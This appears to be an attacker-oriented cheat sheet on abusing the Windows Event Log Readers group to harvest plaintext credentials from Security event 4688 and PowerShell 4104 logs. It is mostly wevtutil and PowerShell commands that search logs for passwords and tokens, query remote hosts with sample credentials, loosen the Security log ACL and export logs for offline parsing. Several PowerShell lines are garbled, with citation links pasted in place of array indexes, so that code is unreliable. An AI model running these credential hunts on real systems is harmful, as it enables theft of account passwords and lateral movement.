## Event Log Readers

Members of the Event Log Readers group can read Windows event logs locally. The most valuable log for an attacker is the Security log, specifically event ID 4688 (process creation), because when command line auditing is enabled, credentials passed as command line arguments are logged in plaintext. 

***

## Confirming Group Membership and Access

```cmd
:: Check if current user is a member
net localgroup "Event Log Readers"
whoami /groups | findstr "Event Log"
```

Important access caveat: `wevtutil` works for Event Log Readers members, but `Get-WinEvent` against the Security log requires either local admin rights or an explicit registry permission change on `HKLM\System\CurrentControlSet\Services\Eventlog\Security`. 

***

## Key Event IDs to Hunt

| Event ID | Log | What it Contains |
|---|---|---|
| 4688 | Security | New process created, includes full command line if enabled |
| 4624 | Security | Successful logon, reveals logon type and source IP |
| 4648 | Security | Logon with explicit credentials (runas, net use) |
| 4672 | Security | Special privileges assigned to new logon |
| 4698 | Security | Scheduled task created |
| 4720 | Security | New user account created |
| 4732 | Security | User added to a local security group |
| 4104 | PowerShell/Operational | Script block execution, includes de-obfuscated code |

***

## Hunting Credentials in Event ID 4688

### wevtutil Method (CMD-compatible, works with Event Log Readers)

```cmd
:: Search Security log for /user keyword in command lines (reverse order, newest first)
wevtutil qe Security /rd:true /f:text | findstr "/user"
:: Example hit: net use T: \\fs01\backups /user:tim MyStr0ngP@ssword

:: Broader credential keyword search
wevtutil qe Security /rd:true /f:text | findstr /i "password\|/user\|passwd\|pwd\|credential\|secret\|token"

:: Run against a remote machine using alternate credentials
wevtutil qe Security /rd:true /f:text /r:dc01 /u:domain\julie.clay /p:Welcome1 | findstr "/user"

:: Limit to last 1000 events for speed
wevtutil qe Security /c:1000 /rd:true /f:text | findstr "/user"

:: Export Security log to file for offline parsing (when on a time limit)
wevtutil epl Security C:\Windows\Temp\security.evtx
:: Transfer and parse offline with full tools
```

### Get-WinEvent Method (PowerShell, requires admin or registry change)

```powershell
# Basic search for /user in process command lines
Get-WinEvent -LogName Security |
    Where-Object { $_.ID -eq 4688 -and $_.Properties [lantern.splunk](https://lantern.splunk.com/Security_Use_Cases/Threat_Hunting/Enabling_Windows_event_log_process_command_line_logging_via_group_policy_object).Value -like '*/user*' } |
    Select-Object TimeCreated, @{Name='CommandLine';Expression={$_.Properties [lantern.splunk](https://lantern.splunk.com/Security_Use_Cases/Threat_Hunting/Enabling_Windows_event_log_process_command_line_logging_via_group_policy_object).Value}}

# Broader search across multiple credential keywords
Get-WinEvent -LogName Security |
    Where-Object { $_.ID -eq 4688 } |
    Select-Object TimeCreated, @{Name='CmdLine';Expression={$_.Properties [lantern.splunk](https://lantern.splunk.com/Security_Use_Cases/Threat_Hunting/Enabling_Windows_event_log_process_command_line_logging_via_group_policy_object).Value}} |
    Where-Object { $_.CmdLine -match "pass|pwd|/user|cred|secret|token|key" }

# Faster approach using FilterHashtable (avoids loading all events into memory)
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4688} |
    Where-Object { $_.Properties [lantern.splunk](https://lantern.splunk.com/Security_Use_Cases/Threat_Hunting/Enabling_Windows_event_log_process_command_line_logging_via_group_policy_object).Value -ne '' } |
    Select-Object TimeCreated, @{Name='CmdLine';Expression={$_.Properties [lantern.splunk](https://lantern.splunk.com/Security_Use_Cases/Threat_Hunting/Enabling_Windows_event_log_process_command_line_logging_via_group_policy_object).Value}} |
    Where-Object { $_.CmdLine -match "/user|pass|cred" }

# Run against a remote machine with alternate credentials
$cred = Get-Credential
Get-WinEvent -LogName Security -ComputerName dc01 -Credential $cred |
    Where-Object { $_.ID -eq 4688 -and $_.Properties [lantern.splunk](https://lantern.splunk.com/Security_Use_Cases/Threat_Hunting/Enabling_Windows_event_log_process_command_line_logging_via_group_policy_object).Value -like '*/user*' } |
    Select-Object TimeCreated, @{Name='CmdLine';Expression={$_.Properties [lantern.splunk](https://lantern.splunk.com/Security_Use_Cases/Threat_Hunting/Enabling_Windows_event_log_process_command_line_logging_via_group_policy_object).Value}}
```

### XPath Query Method (Most Efficient for Large Logs)

```powershell
# XPath filters happen at the provider level, much faster than piping all events
$xpath = "*[System[EventID=4688] and EventData[Data[@Name='CommandLine'] and contains(Data,'/user')]]"
Get-WinEvent -LogName Security -FilterXPath $xpath |
    Select-Object TimeCreated, @{Name='CmdLine';Expression={$_.Properties [lantern.splunk](https://lantern.splunk.com/Security_Use_Cases/Threat_Hunting/Enabling_Windows_event_log_process_command_line_logging_via_group_policy_object).Value}}

# XPath via wevtutil (cmd.exe compatible)
wevtutil qe Security /q:"*[EventData[Data[@Name='CommandLine'] and contains(Data,'/user')]]" /f:text
```

***

## Grant Event Log Readers Access to Get-WinEvent (If Needed)

If you have the ability to modify the registry (via another privilege or as an admin on a non-DC host):

```cmd
:: Grant Event Log Readers access to the Security log registry key
wevtutil sl Security /ca:"O:BAG:SYD:(A;;0x1;;;SY)(A;;0x1;;;BA)(A;;0x1;;;ER)"
:: ER = Event Log Readers SID
```

***

## PowerShell Operational Log (4104) - No Admin Required

The `Microsoft-Windows-PowerShell/Operational` log is readable by any local user. If script block logging is enabled, every PowerShell command block executed on the host is recorded here in de-obfuscated form, including credentials passed to cmdlets. 

```powershell
# Read PowerShell script block log (no admin needed)
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
    Where-Object { $_.ID -eq 4104 } |
    Select-Object TimeCreated, @{Name='Script';Expression={$_.Properties [forums.powershell](https://forums.powershell.org/t/get-winevent-reading-security-logs/6717).Value}} |
    Where-Object { $_.Script -match "pass|cred|secret|token|key|ConvertTo-SecureString|-AsPlainText" }

# Check if script block logging is even enabled first
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging
# Value 1 = enabled, entries in 4104 may contain credentials

# Also check module logging
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" /v EnableModuleLogging

# List all 4104 events in a readable format, limited to last 50
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 50 |
    Where-Object { $_.ID -eq 4104 } |
    Format-List TimeCreated, Message
```

### What to Look For in 4104 Logs

```powershell
# Common patterns that expose credentials in PowerShell logs:
$pass = ConvertTo-SecureString "PlaintextPass" -AsPlainText -Force
New-Object PSCredential("domain\user", $pass)

$cred = Get-Credential
Invoke-Command -ComputerName dc01 -Credential $cred

net use \\server\share /user:domain\username password

[System.Net.NetworkCredential]::new("user", "password")
```

***

## Checking Log Configuration

Before hunting, confirm what logging is actually enabled on the target:

```powershell
# Check if process creation command line logging is enabled (GPO setting)
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled
# Value 1 = command lines ARE logged in 4688 = hunt for credentials

# Check if 4688 auditing is even enabled at all
auditpol /get /subcategory:"Process Creation"
# "Success and Failure" or "Success" = 4688 events are being generated

# Check Security log size (affects how far back you can search)
wevtutil gl Security | findstr "maxSize\|fileMax"
# maxSize: 20971520 = ~20MB default (often small, events roll quickly)
```

***

## Full Credential Hunt Sequence

```powershell
# 1. Check log configuration
auditpol /get /subcategory:"Process Creation"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled

# 2. Hunt Security log via wevtutil (Event Log Readers group sufficient)
wevtutil qe Security /rd:true /f:text | findstr /i "/user\|password\|passwd\|pwd\|secret"

# 3. Hunt PowerShell Operational log (no special rights needed)
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
    Where-Object {$_.ID -eq 4104 -and $_.Message -match "pass|cred|secret|-AsPlainText"}

# 4. Check Application log for app-specific credential leakage
wevtutil qe Application /rd:true /f:text | findstr /i "password\|credential\|login"

# 5. Export all logs for offline analysis if time allows
wevtutil epl Security C:\Windows\Temp\security.evtx
wevtutil epl "Microsoft-Windows-PowerShell/Operational" C:\Windows\Temp\ps_operational.evtx
```

Event ID 4688 with command line logging is often the most overlooked detection control in mid-sized organisations. The same configuration that defenders use to catch attackers is the exact configuration attackers exploit to find credentials, since administrators frequently pass passwords on the command line when running `net use`, `runas`, or custom scripts.
